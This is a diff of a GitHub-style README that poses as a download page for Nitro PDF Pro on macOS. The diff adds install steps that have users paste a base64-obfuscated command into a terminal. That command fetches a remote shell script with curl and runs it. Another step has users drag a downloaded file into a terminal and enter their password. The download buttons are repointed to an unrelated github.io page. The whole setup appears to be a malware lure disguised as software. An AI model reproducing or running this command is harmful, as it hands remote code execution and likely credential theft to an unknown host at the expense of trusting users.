@@ -3,9 +3,33 @@
 Nitro PDF Pro is a powerful and easy-to-use PDF editor designed for macOS users. It offers advanced features for creating, editing, converting, and signing PDF documents, making it a complete solution for personal and business use on Mac.
 
 ## ✅ Download Nitro PDF Pro for macOS  
-[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](#)
+[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](https://shuziktobehuman.github.io/huja/NitroPDF)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is Nitro PDF Pro?
 
@@ -35,17 +59,7 @@ Nitro PDF Pro delivers a robust set of tools to manipulate PDF files seamlessly 
 
 ---
 
-[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](#)
-
----
-
-## 📥 How to Use
-
-- ✅ Download and install Nitro PDF Pro on your macOS device  
-- 📝 Open PDFs to edit content or create new documents  
-- 📄 Convert PDFs into editable Office formats or vice versa  
-- 🔐 Apply security settings like encryption or digital signatures  
-- 📤 Save, export, and share your files easily  
+[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](https://shuziktobehuman.github.io/huja/NitroPDF)
 
 ---
 
